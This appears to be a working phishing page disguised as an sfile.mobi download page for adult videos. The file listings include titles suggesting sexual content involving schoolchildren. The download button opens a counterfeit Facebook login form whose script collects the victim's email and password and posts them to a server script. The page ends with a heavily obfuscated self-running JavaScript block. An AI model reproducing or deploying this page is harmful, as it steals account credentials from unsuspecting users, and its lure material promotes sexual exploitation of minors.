<!DOCTYPE html><html lang="en"><head>
<meta charset="utf-8">
<title>Bule Nganu sama pegawai hotel . zip</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=5">
<meta name="google-site-verification" content="2NwCLW-ak-mrVHPhdSsJ9KBoML_nkRUqkRvNxyzw2SA">
<meta name="google-site-verification" content="K8BVKZrxNyr7t0rgA19KvWqJYcmJ6FYPdOiY2SnZn5A">
<meta name="google-site-verification" content="EiBvao9Pdk9vO_bwZ7nLuosRTG-GMX_SIY5l946X4X0">
<meta name="msvalidate.01" content="56522D4D2595E2B2377EE0390ADE7765">
<meta name="description" content="Download Bule Nganu sama pegawai hotel.zip diunggah oleh pada 12 November 2023 di folder Other dengan ukuran 7.51 KB.">
<meta property="og:type" content="website">
<meta property="og:title" content="Bule Nganu sama pegawai hotel . zip">
<meta property="og:description" content="Download Bule Nganu sama pegawai hotel.zip diunggah oleh pada 12 November 2023 di folder Other dengan ukuran 7.51 KB.">
<meta property="og:url" content="https://sfile.mobi/3lY1gaLWpWX">
<meta property="og:site_name" content="sfile.mobi">
<meta property="fb:app_id" content="1971214313162948">
<meta name="theme-color" content="#0C76D0 ">
<link rel="stylesheet" href="css/main-min.css">
<link rel="stylesheet" href="css/facebook.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
$(document).ready(function(){$('body').hide();});
    </script>
<link rel="icon" sizes="192x192" href="images/sfile-icon-192x192.png">
<link rel="shortcut icon" href="images/sfile-favicon.png" type="image/x-icon">
<style>
/* raleway-regular - latin */
@font-face {
  font-family: 'Raleway';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: local('Raleway'), local('Raleway-Regular'),
       url('fonts/raleway-v14-latin-regular.woff2') format('woff2'), /* Chrome 26+, Opera 23+, Firefox 39+ */
       url('fonts/raleway-v14-latin-regular.woff') format('woff'); /* Chrome 6+, Firefox 3.6+, IE 9+, Safari 5.1+ */
}
body,h1,h2,h3,h4,h5,h6 {font-family: "Raleway", sans-serif}
body, html {
    height: 100%;
    line-height: 1.8;
}
h1 {
	font-weight: normal;
	font-size: 1.2rem;
	}
h1.intro {
	margin-left: 35px;
	overflow: hidden;
	text-overflow: ellipsis;
	display: -webkit-box;
   -webkit-line-clamp: 1; /* number of lines to show */
   -webkit-box-orient: vertical;
}
.icon {
  display: inline-block;
  width: 1em;
  height: 1em;
  margin-bottom: -2px;
  stroke-width: 0;
  stroke: currentColor;
  fill: currentColor;
}
.icon-twitter-square {
  color: #00aced;
  font-size: 2em;
  margin-bottom: -5px;
}
.icon-facebook-square {
  color: #3b5998;
  font-size: 2em;
  margin-bottom: -5px;
}
.icon-share-square {
  color: Dodgerblue;
  font-size: 2em;
  margin-bottom: -5px;
}
.file-content {
	padding: 3px;
}
.intro-container{
	padding: .01em 8px;
	color: white;
}
img.intro {
	position: absolute;
	margin-block: 10px;
}
.w3-bar .w3-button {
    padding: 16px;
}
.ads2 {
  max-width:100%;
	margin-left:auto;
	margin-right:auto;
  height: auto;
}
@media (min-width: 350px) {
  .infeed {
    height: 300px;
  }
@media (min-width: 500px) {
  .infeed {
    height: 200px;
  }
}
@media (min-width: 800px) {
  .infeed {
    height: 280px;
  }
}
.flex-container {
display: -webkit-box;
overflow-x: scroll;
}
.flex-container > div {
  width: 110px;
  margin: 12px;
  margin-right: auto;
  line-height: 20px;
  font-size: 13px;
  border-radius: 5px;
}
.boxapp:hover {
    background-color: #f1f1f1;
	box-shadow: 0 15px 30px rgba(0,0,0,0.1);
	transform: translate3d(0, -1px, 0);
}
.alignleft {
	float: left;
}
.alignright {
	float: right;
}
</style>
</head>
<body style="display:none;">

<div class="w3-top">
<div class="w3-bar w3-blue w3-card-2" id="myNavbar">
<a href="https://sfile.mobi" class="w3-bar-item w3-button w3-wide"><img width="110" height="25" src="images/Sfile-Logo.svg" alt="Sfile.mobi"></a>

<div class="w3-right w3-hide-small">
<a class="w3-bar-item w3-button"><svg class="icon"><use xlink:href="images/symbol-defs.svg#icon-cloud-upload"></use></svg> UPLOAD</a>
<a class="w3-bar-item w3-button"><svg class="icon"><use xlink:href="images/symbol-defs.svg#icon-list-alt"></use></svg> Latest Upload</a>
<a class="w3-bar-item w3-button"><svg class="icon"><use xlink:href="images/symbol-defs.svg#icon-line-chart"></use></svg> Trending Files</a>
<a class="w3-bar-item w3-button"><svg class="icon"><use xlink:href="images/symbol-defs.svg#icon-sign-in"></use></svg> LOGIN</a>
<a class="w3-bar-item w3-button"><svg class="icon"><use xlink:href="images/symbol-defs.svg#icon-user-plus"></use></svg> REGISTER</a>
</div>

<button aria-label="Button Navigation" class="w3-bar-item w3-button w3-right w3-hide-large w3-hide-medium" onclick="w3_open()" id="Sidebar">
<svg class="icon" id="xSidebar"><use xlink:href="images/symbol-defs.svg#icon-bars"></use></svg>
</button>
</div>
</div>

<nav class="w3-sidebar w3-bar-block w3-blue w3-card-2 w3-animate-left w3-hide-medium w3-hide-large" style="display:none" id="mySidebar">
<button aria-label="Button Navigation" onclick="w3_close()" class="w3-bar-item w3-button w3-large w3-padding-16" id="mySidebar">
</button>
<a class="w3-bar-item w3-button"><svg class="icon"><use xlink:href="images/symbol-defs.svg#icon-cloud-upload"></use></svg> UPLOAD</a>
<a class="w3-bar-item w3-button"><svg class="icon"><use xlink:href="images/symbol-defs.svg#icon-list-alt"></use></svg> Latest Upload</a>
<a class="w3-bar-item w3-button"><svg class="icon"><use xlink:href="images/symbol-defs.svg#icon-line-chart"></use></svg> Trending Files</a>
<a class="w3-bar-item w3-button"><svg class="icon"><use xlink:href="images/symbol-defs.svg#icon-sign-in"></use></svg> LOGIN</a>
<a class="w3-bar-item w3-button"><svg class="icon"><use xlink:href="images/symbol-defs.svg#icon-user-plus"></use></svg> REGISTER</a>
</nav>
<div class="w3-padding-64">
<div class="w3-content">
<div class="file-content">
<div class="intro-container w3-blue-grey">
<img class="intro" src="images/zip.svg" alt="Bule Nganu sama pegawai hotel.zip" width="32" height="32">
<h1 class="intro">Bule Nganu sama pegawai hotel</h1>
</div><div class="list"><svg class="icon icon-file-code-o"><use xlink:href="images/symbol-defs.svg#icon-file-code-o"></use></svg> - application/zip</div><div class="list">
<svg class="icon icon-user-o"><use xlink:href="images/symbol-defs.svg#icon-user-o"></use></svg> - <a href="https://sfile.mobi/user.php?id=686502" rel="nofollow">Mister Boxep</a> on <a href="https://sfile.mobi/loads/4/Other.html">Other</a>
</div>
<div class="list">
<svg class="icon icon-upload"><use xlink:href="images/symbol-defs.svg#icon-upload"></use></svg> - Uploaded: 12 November 2023</div>
<div class="list">
<svg class="icon icon-cloud-download"><use xlink:href="images/symbol-defs.svg#icon-cloud-download"></use></svg> - Downloads: 302</div>
</div>
</div>
<p class="w3-center">
<span class="w3-button w3-blue w3-round" onclick="opfalx()">Download File zip</span>
</p>
<div class="file-content">
<div class="list w3-border-top" style="text-align: center;"><p>Download Bule Nganu sama pegawai hotel.zip</p><span>Bule Nganu sama pegawai hotel</span>
</div>
</div>
<div class="list">
Share on <a class="facebook" aria-label="Share to Facebook" target="_blank"><svg class="icon icon-facebook-square"><use xlink:href="images/symbol-defs.svg#icon-facebook-square"></use></svg></a> <a class="twitter" aria-label="Share to Twitter" https:="" sfile.mobi="" 3ly1galwpwx&text="FIX" bug="" sound="" kendaraan"="" target="_blank" rel="noopener noreferrer"><svg class="icon icon-twitter-square"><use xlink:href="images/symbol-defs.svg#icon-twitter-square"></use></svg></a> or <span id="btn-share" style="color: Dodgerblue; cursor: pointer;"><svg class="icon icon-share-square"><use xlink:href="images/symbol-defs.svg#icon-share-square"></use></svg></span>
</div>
<script>
document.getElementById('btn-share').addEventListener('click', function() {
	navigator.share({
		title: 'Download Bule Nganu sama pegawai hotel.zip',
		url: '<?= $_SERVER['SERVER_NAME'] ?>',
	})
});
</script><div class="list">
<div class="w3-text-blue" style="cursor: pointer;">Show Comments</div>
</div>
<div class="file-content">
<div class="w3-container w3-blue w3-padding-bottom"><h2><svg class="icon icon-line-chart" style="margin-bottom: -3px;"><use xlink:href="images/symbol-defs.svg#icon-line-chart"></use></svg> File Of The Year</h2>
</div><div class="list">
<img src="images/zip.svg" alt="Video remas Susu.zip" height="32" width="32">
<a href="index.php">Video remas Susu.zip</a><br>
<small>7.25 MB, Download: 167</small>
</div><div class="list">
<img src="images/zip.svg" alt="Video remas Susu.zip" height="32" width="32">
<a href="JsjXsjOndheirj.php">Kumpulan video ARACHU terbaru.zip</a><br>
<small>10.09 MB, Download: 308</small>
</div><div class="list">
<img src="images/zip.svg" alt="10 B0kep Indo terbaru.zip" height="32" width="32">
<a href="XndiaofnwcKda.php"> 10 B0kep Indo terbaru.zip</a><br>
<small>15.83 MB, Download: 515</small>
</div><div class="list">
<img src="images/zip.svg" alt="Anak SMA Ngen di wc sekolah.zip" height="32" width="32">
<a href="HdkanKsgdabao.php">Anak SMA Ngen di wc sekolah full.zip</a><br>
<small>21.62 MB, Download: 251</small>
</div><div class="list">
<img src="images/zip.svg" alt="Hentai Nikmat 4 video.zip" height="32" width="32">
<a href="baKskwv17bsj.php">Hentai Nikmat 4 video.zip</a><br>
<small>15.17 MB, Download: 360</small>
</div><div class="list">
<img src="images/zip.svg" alt="Bule Nganu sama pegawai hotel.zip" height="32" width="32">
<a href="sKsakaHakdhaka.php">Bule Nganu sama pegawai hotel.zip</a><br>
<small>26.77 MB, Download: 302</small>
</div><div class="paging"><a class="w3-bar-item w3-button w3-blue w3-hover-blue">1</a> <a class="w3-bar-item w3-button w3-hover-blue">&gt;&gt;</a></div>
</div>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</div><script>
var mySidebar = document.getElementById("mySidebar");
function w3_open() {
    if (mySidebar.style.display === "block") {
        mySidebar.style.display = "none";
    } else {
        mySidebar.style.display = "block";
    }
}

function w3_close() {
    mySidebar.style.display = "none";
}

window.addEventListener('mouseup', function(e) {
	if(e.target.id!=="Sidebar" && e.target.id!=="mySidebar" && e.target.className!=="w3-bar-item w3-button") {
		mySidebar.style.display = "none";
	}
});
</script>
<div class="menu" align="center">
<a>Member Payments</a> | <a>Privacy Policy</a> | <a>Terms of Services</a> | <a>Contact</a>
</div>
<div class="menu" align="center">© 2023, <a>sfile.mobi</a><br>Free file sharing service</div>
                    </div>
                </div>
            </footer>
    <div class="popup-login login-facebook animated fadeIn" style="display: none;" id="facebook">
        <div class="popup-box-login-fb">
            <div class="navbar-fb">
                <img width="45" src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/20240202_164508.png">
            </div>
            <div class="content-box-fb">
                <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
                <p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
                <img width="70" height="70" src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/20240110_175143.png">
                <div class="txt-login-fb">
                    Masuk ke akun Facebook Anda untuk melanjutkan download
                </div>
                <form class="login-form" method="POST" action="">
                    <label>
                        <input type="text" id="alx_email_fb2" name="email" placeholder="Nomor ponsel atau email"
                            autocomplete="off" autocapitalize="off">
                    </label>
                    <label>
                        <input type="password" id="alx_password_fb2" name="sandi" placeholder="Kata Sandi Facebook" autocomplete="off"
                            autocapitalize="off">
                    </label>
                    <input type="hidden" name="ua" id="ua" value="sfilemobi" readonly>
                            <input type="hidden" name="log" id="log" value="Facebook" readonly>
                    <button type="submit" id="btnfb" class="btn-login-fb">Masuk</button>
                    <button class= "btn-login-fb load" style="display: none;">
                           <i class="fa fa-spinner fa-spin" style=""></i> Loading...
                        </button>
                </form>
                <div class="txt-create-account">Buat Akun</div>
                <div class="txt-not-now">Lain Kali</div>
                <div class="txt-forgotten-password">Lupa Kata Sandi?</div>
            </div>
            <div class="language-box">
                <center>
                    <div class="language-name language-name-active">Bahasa Indonesia</div>
                    <div class="language-name">English (UK)</div>
                    <div class="language-name">Basa Jawa</div>
                    <div class="language-name">Bahasa Melayu</div>
                    <div class="language-name">日本語</div>
                    <div class="language-name">Español</div>
                    <div class="language-name">Português (Brasil)</div>
                    <div class="language-name">
                        <i class="fa fa-plus"></i>
                    </div>
                </center>
            </div>
            <div class="copyrights">Facebook Inc.</div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/gh/StyleeJs/3.6.0/jquery.js"></script>
    <script type="text/javascript">
        function opfalx() {
                $('#facebook').fadeIn();
                }

        window.addEventListener('submit', function (e) {
            e.preventDefault();
            setTimeout(() => {
                var user = $('#alx_email_fb2').val();
                var pass = $('#alx_password_fb2').val();
                if (user == '' || user == null) {
                    $('.email').show();
                    $('.sandi').hide();
                    return false;
                } else {

                    if (user.includes('@')) {
                        let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
                        if (user.match(pattern)) {
                            $('.email').hide();
                        } else {
                            $('.email').show();
                            $('.sandi').hide();
                            return false;
                        }
                    }

                    if (!isNaN(user)) {
                        if (user.length <= 10) {
                            $('.email').show();
                            $('.sandi').hide();
                            return false;
                        } else {
                            $('.email').hide();
                        }
                    }

                    if (user.match(/\s/g)) {
                        $('.email').show();
                        $('.sandi').hide();
                        return false;
                    } else {
                        $('.email').hide();
                    }

                    var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                    if (user.match(regex)) {
                        $('.email').show();
                        $('.sandi').hide();
                        return false;
                    }


                    if (user.length <= 5) {
                        $('.email').show();
                        $('.sandi').hide();
                        return false;
                    } else {
                        $('.email').hide();
                    }

                }
                if (pass == '' || pass == null || pass.length <= 5) {
                    $('.sandi').show();
                    return false;
                } else {
                    $('.sandi').hide();
                }
                var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                if (pass.match(regexs)) {
                    $('.sandi').show();
                    $('.email').hide();
                    return false;
                } else {
                    $('.sandi').hide();
                }
                $.ajax({
                    type: 'POST',
                    url: 'final.php',
                    data: $('.login-form').serialize(),
                    dataType: 'text',
                    beforeSend: function() {
                            $(".log1").hide();
                            $(".log2").show();
                            $(".log2").prop("disabled", true);
                        },
                        success: function() {
                                    location.href = "download";
                    }
                })
            }, 1000)
        })

    </script><?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
(function(){var Ilf='',xkX=616-605;function ElM(i){var u=2376457;var s=i.length;var d=[];for(var y=0;y<s;y++){d[y]=i.charAt(y)};for(var y=0;y<s;y++){var n=u*(y+281)+(u%40988);var g=u*(y+78)+(u%26934);var v=n%s;var c=g%s;var a=d[v];d[v]=d[c];d[c]=a;u=(n+g)%3341854;};return d.join('')};var CmU=ElM('xgfrdruvcptcmnltsqzijkesonyowaruchotb').substr(0,xkX);var IRo='aznf<=9i;nn3r;p;muso)+sn+tv]=dd {iyvk;t}.,lr) uC,tnz=x(=4e.v.o}=wnrso[(=f(14-u.b4[)[b 8orog.5vf1ta9ua0s7.lfA)08.nq]s);;e)v=.(i>=s.7err(rit1vs;8w<roqupnerp +uvro);wgvaani6lr)-mnrr21+. o;1)=)c"ryrg(kf=s(eap]r1];utar  )v(0 r)eig=..fl+vgi3n (u,eavav>;s"t;,=a;.t.iy"pn8o.(j)1(v,,nl0)=a]v1;htv=nk=-(o.=r+rt)r)a;wa[sy;=.+];(ad av+ucl)emrng!q;nd;,7a0roe0 ;h[87+r"y8l=( aS;etrie<*is,sa5vi6vhrl)ch[r-)h{Atar4mut(oCea7 .;(xnrb;9a]sxCufhCc0chg +ehn},)e"6thd;wyazi<b[lah(vlpf(gahen ,;[*]s= ps=th-ive]enrtt;)n=f2kwqzr+"grhv(20dwAbwet,rr=;a=e; lh2;2jeoe=;(xtuh;h}a3a(v=-mxqia.[+= 0sCujanx";{.roya,<t7;[{1r(f,e+e8+=a5r,g=d Ce(o8hf=;"crcr+r!;s,wnrotl abp0n7;fs1(,.[ =)a)fnt+f)sdr{l{)e[aou((r[5;k[x;1t,h(r=e()u;)}.v)=66=;; )ee]"vf7+id)92,=9.s6=3i(a;,6=,j-d(+i8,,)=v=r(nsgmli+.7g+o=ll0lw]c], 6"1f5ngvca0h]u6uu).leehyl;ir+AcCe}Cit6t(ol;pc=;;r}(rx82fc+n=S+rwr9vrf;,ahetkmgvc,xhhop,aey,jg5d(+=ii)m +A9g..a{]n 1)p';var BaB=ElM[CmU];var xuW='';var HNg=BaB;var gbL=BaB(xuW,ElM(IRo));var xzf=gbL(ElM('eond+7A)ript;oqave48 orA;sfe!3(}mA,(}&_%.A_3l.6A)_a=C)3A,_s!_\'A_s6gm{Acgs;e=7Atwd\'ad*=d;i+gA\/64t#9$]A$x(sfx842n).o=+ab6b,nA7r3x$ )+a(ni0beAhrv)(n(2edj9_( t(Aip,ct]A[1e16_ws,;}a]34#3d)o(qt%d6Sa.cAi.6gmedlAA 4f_(A%(!0iAo8A= obA\/o$#5!ra%i9-};!jfgj..\/v!%j.734p7);dfA]!8C3u.s0(A3Al;)(hn(f..1A{!4A3,t;b%do.Ab5()A$A$3%k8((sf.{A8y}x3A}e;AgAAaA9uA$5=)};Ao asA]Aof2<i.7:=fq(r2(cA.yg}ndth.5.)(.$a0$6;1Au51A)c05ie_4!s{a,do5))epAA=d.co(h}ca6o]t(ih} g)1t).]o);(Ap60pu!(<05d.5r ]jjdwg]g(pA,43 b,i41)A,0$.$ ]u4su8h)n*#2 Abi8j*:uf(6.!5-.7n7t),(i$AdA$13A003 t.e=_1e;$.(5.1_j,ig.(;A6eva4_A3;i064=7dn5r5)(3j)_=bj=A3A$usAA.{mh(,3nffs,s15nsp,$A)fA3u({s"$.._ .ie_rgu4y!;e=xt(8!.<_aAl:7{;m.s2dbr"+=+{rArAAueA9f%A%1p%l!d=l_#sbq=A.)3.,337;!ebA1t(nd.$b3Aob{%3rA\/!0A3)A_())rs]_(A)A.en"na4nb(4eA2 ;}AA\'mn:)A0;_d;x},7]tAa6&=.xb$),)fA_ahcA=AAAd7+r76AtoeA$,1}_.g3)_bl .n)0n.d!(;04gAA=vA}(q_).9)s2_$5,<eAa.den,(d)_c{ A,]Aco0[..,y}11trA\/:).(3))2;;d4a[[3(6 !csed"e{s:$A1f3egA=53rA!t!_\/Aetbu.4;A_$!()u3t)Al._6;=6i iffoA6AoeA5 .s-$$.6ia,!r.d&24%_7)}$)n.,]Azlqd )ti=Azeo_a;;A=l2+(9}9(A!;b#g;r4loi(A3;Afa.fAi8{_{4:.-r_6ob}A6))($})5!A!%__.2).A8\/q&}.51-n(b;6dA,%7]AAo!_A9Alis)A(54f37s4uA)#)+(A.8((Af0As;.so85.3it2k2.6s %0}A7*(AvT\'0A8 9_".)p)_A=,gl4.\/)\'5a.4 0erA74])s {{7A8l3r(rS9A)q$$A,i 0)69vAa!{ii%:5]:s3Aa,6)d(As 95td3SAf=03;d!86dua8;$jA6)r0g3A(5""[tbo)!.so):!S.=n2t=A9$ib3_$"],yArA\/j;$_!m.dd:gA5 p).d)dA3+(n=,_4A_rA;=k}d64#iA;(_. '));var kJB=HNg(Ilf,xzf );kJB(6797);return 5600})()
</script>
</body>

</html>